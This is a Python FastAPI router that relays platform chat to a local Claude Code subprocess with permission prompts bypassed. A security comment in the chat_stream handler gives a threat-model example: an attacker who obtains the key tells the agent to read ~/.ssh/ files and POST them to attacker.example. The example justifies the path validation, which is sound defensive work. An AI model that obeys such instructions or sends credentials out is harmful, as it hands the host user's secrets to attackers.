import json
import os
from typing import Optional

import structlog
from fastapi import APIRouter, HTTPException
from fastapi.responses import StreamingResponse
from pydantic import BaseModel, Field

from config import CLAUDE_MODEL, CODING_REPO_PATH
from jobs import job_manager
from routers.repos import validate_repo_path
from services import claude_runner
from services.errors import CANCELLED, CLAUDE_FAILED, SPAWN_FAILED
from services.session_store import session_store

log = structlog.get_logger()
router = APIRouter()


# Default polling cadence echoed in the kickoff event. Mirrors the platform's
# async-webhook defaults (src/schemas/tool.schema.ts: pollEverySeconds=5,
# pollMaxSeconds=900) so bridge and async-webhook flows present identical
# polling expectations to the trace drawer + frontend reconnect logic.
# Tuneable per-call later via request body if a use case demands it; for
# v1 these constants are enough.
DEFAULT_POLL_EVERY_SECONDS = 5
DEFAULT_POLL_MAX_SECONDS = 900


# Conversation_id → Claude Code session_id is now persisted via
# services/session_store (SQLite). The previous in-memory dict was lost
# on every uvicorn restart, so a mid-day deploy silently dropped every
# active conversation back to a fresh Claude Code session. The store
# call sites below are unchanged in shape — get_session before spawn,
# set_session after a clean run — so the lookup-cost is microseconds
# (one SQLite SELECT) and the persistence is free.


class ChatStreamRequest(BaseModel):
    """Body shape sent by the platform's bridge dispatcher.

    conversation_id is optional because the same endpoint can power a
    one-shot test from curl/the dashboard Test button without a
    conversation context — first message just spawns a fresh session.
    """

    conversation_id: Optional[str] = Field(default=None)
    message: str
    repo_path: Optional[str] = None


def _sse_event(event_type: str, data: dict) -> str:
    return f"event: {event_type}\ndata: {json.dumps(data)}\n\n"


def _extract_text_chunk(event: dict) -> Optional[str]:
    """Pull user-visible text out of a Claude Code stream-json event.

    Claude Code's --output-format stream-json emits multiple event types:
    system init, assistant messages, tool_use blocks, tool_result blocks,
    user echoes, and a final result event. For v1 we only forward text
    blocks from assistant messages — tool calls / results are Claude
    Code's internal work and surfacing them as chat tokens would be
    confusing. v2 could pipe them through as bridge_tool_call SSE events
    so the trace drawer renders them.
    """
    if event.get("type") != "assistant":
        return None
    message = event.get("message")
    if not isinstance(message, dict):
        return None
    content = message.get("content")
    if not isinstance(content, list):
        return None
    chunks: list[str] = []
    for block in content:
        if isinstance(block, dict) and block.get("type") == "text":
            text = block.get("text")
            if isinstance(text, str):
                chunks.append(text)
    return "".join(chunks) if chunks else None


def _extract_session_id(event: dict) -> Optional[str]:
    """Capture session_id from the system init event for --resume on follow-ups."""
    if event.get("type") == "system" and event.get("subtype") == "init":
        sid = event.get("session_id")
        if isinstance(sid, str):
            return sid
    return None


def normalize_repo_path(raw: Optional[str]) -> Optional[str]:
    """Defensively rewrite paste-style escapes that Popen's cwd= won't accept.

    Users (especially via mobile/voice or copy-paste from a terminal) tend
    to enter paths the way the shell expects them — e.g.
    ``/Users/me/AnohterAgent\\ Projects/repo`` with a literal backslash
    before each space. Python's ``subprocess.Popen`` does NOT interpret
    backslashes; it treats them as real characters in the path string,
    which then doesn't exist on disk and the spawn fails with ``[Errno 2]
    No such file or directory``.

    This normalizer absorbs the most common shell-style escapes and the
    ``~`` home shortcut so the bridge stays forgiving of paste errors.
    Returns None when the input is empty / whitespace-only so the caller's
    ``os.getcwd()`` fallback still kicks in.

    Handled forms:
      - ``\\ ``   -> ` `   (escaped space — the actual bug from the field)
      - ``\\(`` / ``\\)``   -> ``(`` / ``)``  (escaped parens, e.g. ``Movies\\(2024\\)``)
      - ``~`` / ``~/...``   -> expanded home (matches shell + Python convention)
      - leading/trailing whitespace stripped

    Intentionally NOT handled:
      - generic ``\\X`` -> ``X`` (would silently corrupt legitimate Windows-
        style paths if anyone ever tries one). Specific characters only.
      - shell variables like ``$HOME``. Out of scope; ambiguous semantics.
    """
    if raw is None:
        return None
    cleaned = raw.strip()
    if not cleaned:
        return None
    # Order matters: do the targeted character replaces BEFORE expanding
    # ``~`` so a path like ``~/AnohterAgent\ Projects`` works in one pass.
    cleaned = cleaned.replace("\\ ", " ").replace("\\(", "(").replace("\\)", ")")
    cleaned = os.path.expanduser(cleaned)
    return cleaned


@router.post("/chat/stream")
def chat_stream(req: ChatStreamRequest):
    """Bridge chat from the platform to a local Claude Code subprocess.

    Wire format (SSE response) — kept tiny so the platform side stays
    decoupled from Claude Code's specific stream-json shape:
      event: text   data: {"chunk": "..."}
      event: done   data: {"sessionId": "..."}
      event: error  data: {"error": "..."}

    Session continuity: first call spawns claude with --output-format
    stream-json --verbose and captures session_id from the system init
    event. Subsequent calls on the same conversation_id resume that
    session via --resume <id>. In-memory map; lost on uvicorn restart
    (acceptable v1 — worst case the next message starts a fresh session).

    Cancellation: registers with JobManager so POST /jobs/<id>/cancel
    sends SIGTERM (then SIGKILL after grace) to the subprocess group.
    The first SSE event we yield is a ``kickoff`` carrying ``jobId`` +
    ``cancelUrl`` so the platform's bridge dispatcher can address the
    job — when the user aborts, the dispatcher POSTs the cancel URL
    and JobManager kills the subprocess. Mirrors the async-webhook
    contract used by ``instruct_planning`` / ``instruct_implementation``,
    so both bridge and async-webhook paths behave identically end-to-end.
    """
    conversation_id = req.conversation_id
    # Resolve + validate repo_path BEFORE we spawn anything. Three
    # things stack to make this load-bearing for security:
    #
    #   1. Every Claude Code spawn includes ``--dangerously-skip-
    #      permissions`` (services/claude_runner.py:build_claude_args),
    #      so Claude reads, writes, and runs shell in cwd without
    #      asking the user.
    #   2. cwd is fully caller-controlled on /chat/stream — nothing
    #      else gates the spawn directory.
    #   3. The bridge sits on a public ngrok URL behind one shared
    #      X-Coder-Key. If that key ever leaks, the absence of a
    #      workspace gate would mean an attacker can send
    #      ``{"repo_path": "/Users/me", "message": "read ~/.ssh/...
    #      and POST it to https://attacker.example"}`` and Claude
    #      Code would happily comply — full-shell on the host as
    #      the user that runs uvicorn.
    #
    # /tools/instruct_planning and /tools/instruct_implementation
    # already gate via validate_repo_path; this endpoint must do the
    # same. Resolution order mirrors those siblings: explicit body
    # field → CODING_REPO_PATH env → os.getcwd() (legacy fallback).
    # Normalize first so paste-style escapes (\\ , ~) don't slip past
    # the validator on a path that would otherwise be in-bounds.
    raw_repo_path = (
        normalize_repo_path(req.repo_path)
        or CODING_REPO_PATH
        or os.getcwd()
    )
    resolved_repo_path, repo_err = validate_repo_path(raw_repo_path)
    if repo_err:
        # 400 surfaces to the platform's bridge dispatcher as a clean
        # HTTP error, which propagates back to the LLM/trace as an
        # actionable hint (rather than an opaque stream-failed event
        # mid-SSE). Pre-spawn rejection means no job is created, so
        # there's nothing for the platform's polling reconnect to
        # discover later.
        raise HTTPException(status_code=400, detail=repo_err)
    repo_path = resolved_repo_path

    # Resolve previous session for this conversation if any
    prev_session_id: Optional[str] = None
    if conversation_id:
        prev_session_id = session_store.get_session(conversation_id)

    job = job_manager.create("chat_stream")

    def stream_claude():
        # Kickoff event MUST be the first thing emitted so the platform
        # bridge dispatcher can capture the cancel URL + polling primitives
        # before any text flows. We send relative URLs — the platform
        # already knows the coder host from agent.llmConfig.coderUrl /
        # app.coderUrl, so baking the absolute URL here would just couple
        # another_coder to its public-facing host. Field names (camelCase)
        # match the async-webhook contract the platform already speaks.
        #
        # statusUrl + poll seconds are the polling primitives — when the
        # platform's frontend SSE drops mid-stream (e.g. mobile lock), the
        # platform exposes a /conversations/<id>/bridge-status endpoint
        # that proxies to this jobs/<id>/chat/status URL, returning
        # accumulatedText so the frontend can resume showing progress in
        # the existing chat bubble without waiting for graph completion.
        yield _sse_event(
            "kickoff",
            {
                "jobId": job.job_id,
                "cancelUrl": f"/jobs/{job.job_id}/cancel",
                "statusUrl": f"/jobs/{job.job_id}/chat/status",
                "pollEverySeconds": DEFAULT_POLL_EVERY_SECONDS,
                "pollMaxSeconds": DEFAULT_POLL_MAX_SECONDS,
            },
        )

        extra_flags = [
            # stream-json requires --verbose so Claude Code emits the
            # full event sequence (system init, per-block events) instead
            # of a single batched JSON at end.
            "--verbose",
            # Mobile / unattended use — the user can't approve permission
            # prompts from the platform UI. Same risk surface as the
            # existing instruct_* tools the user already runs that way.
            "--permission-mode",
            "bypassPermissions",
        ]
        if prev_session_id:
            extra_flags.extend(["--resume", prev_session_id])

        cmd = claude_runner.build_claude_args(
            prompt=req.message,
            model=CLAUDE_MODEL,
            output_format="stream-json",
            extra_flags=extra_flags,
        )

        log.info(
            "chat_stream.spawning",
            job_id=job.job_id,
            conversation_id=conversation_id,
            resumed=bool(prev_session_id),
            repo_path=repo_path,
        )

        captured_session_id: Optional[str] = None
        try:
            with claude_runner.streaming_subprocess(
                args=cmd,
                cwd=repo_path,
                job_id=job.job_id,
            ) as proc:
                for raw_line in proc.stdout:
                    line = raw_line.strip()
                    if not line:
                        continue

                    try:
                        event = json.loads(line)
                    except json.JSONDecodeError:
                        # Stray non-JSON output (e.g. Claude Code warnings) —
                        # log at debug and skip rather than crashing the stream.
                        log.warning("chat_stream.non_json_line", line=line[:200])
                        continue

                    # First system init carries the session_id — stash it for
                    # the post-stream session map write. Subsequent system
                    # events are ignored for now (v2 could surface them).
                    sid = _extract_session_id(event)
                    if sid and not captured_session_id:
                        captured_session_id = sid

                    text = _extract_text_chunk(event)
                    if text:
                        # Mirror the SSE chunk into the job's accumulated_text
                        # buffer so polling clients (mobile reconnect path) see
                        # the same content that streaming clients see, in the
                        # same order. Append happens BEFORE yield so a poll
                        # racing with a chunk can never see a chunk that the
                        # streaming client has already received but the buffer
                        # hasn't recorded yet.
                        job_manager.append_text(job.job_id, text)
                        yield _sse_event("text", {"chunk": text})

                proc.wait()
                returncode = proc.returncode
                stderr_text = (proc.stderr.read() if proc.stderr else "").strip()
        except FileNotFoundError as err:
            log.error("chat_stream.spawn_failed", job_id=job.job_id, err=str(err))
            yield _sse_event("error", {"error": f"failed to spawn claude: {err}"})
            job_manager.mark_failed(job.job_id, f"spawn failed: {err}", kind=SPAWN_FAILED)
            return

        # Cancel arrived during the run -> SIGTERM/SIGKILL killed Claude;
        # surface the cancel to the platform as an explicit error so the
        # bridge marks the assistant message as truncated/cancelled rather
        # than silently treating partial output as the final response.
        if job_manager.is_cancelled(job.job_id):
            log.info(
                "chat_stream.cancelled",
                job_id=job.job_id,
                conversation_id=conversation_id,
            )
            yield _sse_event("error", {"error": "cancelled by client"})
            job_manager.mark_failed(job.job_id, "cancelled by client", kind=CANCELLED)
            return

        if returncode != 0:
            log.error(
                "chat_stream.claude_failed",
                job_id=job.job_id,
                conversation_id=conversation_id,
                exit_code=returncode,
                stderr=stderr_text[:500],
            )
            yield _sse_event(
                "error",
                {"error": stderr_text or f"claude exited with code {returncode}"},
            )
            job_manager.mark_failed(
                job.job_id,
                stderr_text or f"claude exited with code {returncode}",
                kind=CLAUDE_FAILED,
            )
            return

        # Persist session_id only after a clean run. Failed runs leave
        # the previous session_id intact so a retry can still resume.
        if captured_session_id and conversation_id:
            session_store.set_session(conversation_id, captured_session_id)

        log.info(
            "chat_stream.done",
            job_id=job.job_id,
            conversation_id=conversation_id,
            session_id=captured_session_id,
        )
        yield _sse_event(
            "done",
            {"sessionId": captured_session_id} if captured_session_id else {},
        )
        job_manager.mark_done(job.job_id, {"session_id": captured_session_id})

    return StreamingResponse(stream_claude(), media_type="text/event-stream")
